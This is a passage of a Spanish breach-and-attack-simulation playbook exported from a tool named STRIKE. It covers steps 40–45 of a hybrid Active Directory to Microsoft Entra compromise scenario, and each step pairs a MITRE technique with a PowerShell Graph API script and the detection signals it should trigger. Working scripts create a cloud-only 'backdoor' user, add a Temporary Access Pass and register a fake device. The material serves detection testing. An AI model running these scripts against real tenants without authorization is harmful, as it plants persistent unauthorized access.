Entra audit: role assignment; distinguir origen on-prem del principal y actor cloud.

### 40. Crear usuario cloud-only canary

**MITRE:** T1136.003

Crear una cuenta Entra no sincronizada para emular persistencia fuera de AD.

```powershell
$ErrorActionPreference = "Stop"
if (-not $env:STRIKE_ACCESS_TOKEN) { throw "Falta STRIKE_ACCESS_TOKEN" }
$Headers = @{ Authorization = "Bearer $($env:STRIKE_ACCESS_TOKEN)"; "Content-Type" = "application/json" }
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-entra-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$Pwd=[guid]::NewGuid().ToString()+"aA1!"
$Body=@{ accountEnabled=$true; displayName="STRIKE-BAS Cloud User"; mailNickname="strikebascloud"; userPrincipalName=$env:STRIKE_CLOUD_BACKDOOR_UPN; passwordProfile=@{forceChangePasswordNextSignIn=$false;password=$Pwd}; usageLocation=$env:STRIKE_USAGE_LOCATION } | ConvertTo-Json -Depth 10
$R=Invoke-RestMethod -Method POST -Headers $Headers -Uri "https://graph.microsoft.com/v1.0/users" -Body $Body
$R | ConvertTo-Json -Depth 10 | Set-Content (Join-Path $State "hybrid-cloud-backdoor.json")
```

**Resultado esperado:**

Se crea una identidad cloud-only etiquetada BAS.

**Señales de detección:**

Entra audit: Add user; cloud-only source, actor, UPN y app.

### 41. Agregar TAP a usuario sincronizado

**MITRE:** T1098.001

Agregar un Temporary Access Pass de corta duración al usuario híbrido canary.

```powershell
$ErrorActionPreference = "Stop"
if (-not $env:STRIKE_ACCESS_TOKEN) { throw "Falta STRIKE_ACCESS_TOKEN" }
$Headers = @{ Authorization = "Bearer $($env:STRIKE_ACCESS_TOKEN)"; "Content-Type" = "application/json" }
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-entra-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$Body = @{ lifetimeInMinutes=10; isUsableOnce=$true } | ConvertTo-Json -Depth 12
$Result = Invoke-RestMethod -Method POST -Headers $Headers -Uri "https://graph.microsoft.com/v1.0/users/${STRIKE_CLOUD_USER_ID}/authentication/temporaryAccessPassMethods" -Body $Body
$Result | ConvertTo-Json -Depth 20 | Tee-Object -FilePath (Join-Path $State "hybrid-tap-created.json")
```

**Resultado esperado:**

Se crea un TAP de un solo uso.

**Señales de detección:**

Entra audit: Add TAP; usuario sincronizado, actor y method ID.

### 42. Registrar dispositivo cloud canary

**MITRE:** T1098.005

Crear un objeto de dispositivo canary posterior al pivot híbrido.

```powershell
$ErrorActionPreference = "Stop"
if (-not $env:STRIKE_ACCESS_TOKEN) { throw "Falta STRIKE_ACCESS_TOKEN" }
$Headers = @{ Authorization = "Bearer $($env:STRIKE_ACCESS_TOKEN)"; "Content-Type" = "application/json" }
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-entra-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$Body = @{ accountEnabled=$true; displayName="STRIKE-BAS-Hybrid-Device"; deviceId=[guid]::NewGuid().ToString(); operatingSystem="Windows"; operatingSystemVersion="11-Hybrid-BAS" } | ConvertTo-Json -Depth 12
$Result = Invoke-RestMethod -Method POST -Headers $Headers -Uri "https://graph.microsoft.com/v1.0/devices" -Body $Body
$Result | ConvertTo-Json -Depth 20 | Tee-Object -FilePath (Join-Path $State "hybrid-device-created.json")
```

**Resultado esperado:**

Se crea un device cloud canary.

**Señales de detección:**

Entra audit: Add device; correlación con usuario híbrido/session.

### 43. Revocar sesiones del usuario híbrido canary

**MITRE:** T1531

Revocar sesiones cloud del usuario sincronizado para validar contención.

```powershell
$ErrorActionPreference = "Stop"
if (-not $env:STRIKE_ACCESS_TOKEN) { throw "Falta STRIKE_ACCESS_TOKEN" }
$Headers = @{ Authorization = "Bearer $($env:STRIKE_ACCESS_TOKEN)"; "Content-Type" = "application/json" }
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-entra-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$Body = @{} | ConvertTo-Json -Depth 12
$Result = Invoke-RestMethod -Method POST -Headers $Headers -Uri "https://graph.microsoft.com/v1.0/users/${STRIKE_CLOUD_USER_ID}/revokeSignInSessions" -Body $Body
$Result | ConvertTo-Json -Depth 20 | Tee-Object -FilePath (Join-Path $State "hybrid-revoke-sessions.json")
```

**Resultado esperado:**

Se invalidan refresh tokens posteriores al timestamp de revocación.

**Señales de detección:**

Entra audit: revoke sessions; usuario híbrido, actor y timestamp.

### 44. Consultar sign-ins del usuario híbrido

**MITRE:** T1526

Recuperar sign-ins recientes asociados al usuario canary.

```powershell
$ErrorActionPreference = "Stop"
if (-not $env:STRIKE_ACCESS_TOKEN) { throw "Falta STRIKE_ACCESS_TOKEN" }
$Headers = @{ Authorization = "Bearer $($env:STRIKE_ACCESS_TOKEN)"; "Content-Type" = "application/json" }
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-entra-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$Result = Invoke-RestMethod -Method GET -Headers $Headers -Uri "https://graph.microsoft.com/v1.0/auditLogs/signIns?$filter=userId%20eq%20%27${STRIKE_CLOUD_USER_ID}%27&$top=50"
$Result | ConvertTo-Json -Depth 20 | Tee-Object -FilePath (Join-Path $State "hybrid-signins.json")
```

**Resultado esperado:**

Se obtienen autenticaciones y resultados de Conditional Access.

**Señales de detección:**

Entra sign-in log como fuente primaria de validación.

### 45. Consultar auditoría híbrida de Entra

**MITRE:** T1526

Recuperar cambios recientes sobre usuario, roles, dispositivos y federation config.

```powershell
$ErrorActionPreference = "Stop"
if (-not $env:STRIKE_ACCESS_TOKEN) { throw "Falta STRIKE_ACCESS_TOKEN" }
$Headers = @{ Authorization = "Bearer $($env:STRIKE_ACCESS_TOKEN)"; "Content-Type" = "application/json" }
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-entra-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$Result = Invoke-RestMethod -Method GET -Headers $Headers -Uri "https://graph.microsoft.com/v1.0/auditLogs/directoryAudits?$top=100"
$Result | ConvertTo-Json -Depth 20 | Tee-Object -FilePath (Join-Path $State "hybrid-directory-audits.json")
```

**Resultado esperado:**

Se obtienen eventos de las acciones cloud del ejercicio.

**Señales de detección:**

Entra audit log; initiator, targetResources, activityDisplayName y result.

---
_Exportado desde STRIKE — `hybrid-active-directory-to-microsoft-entra-compromise`_
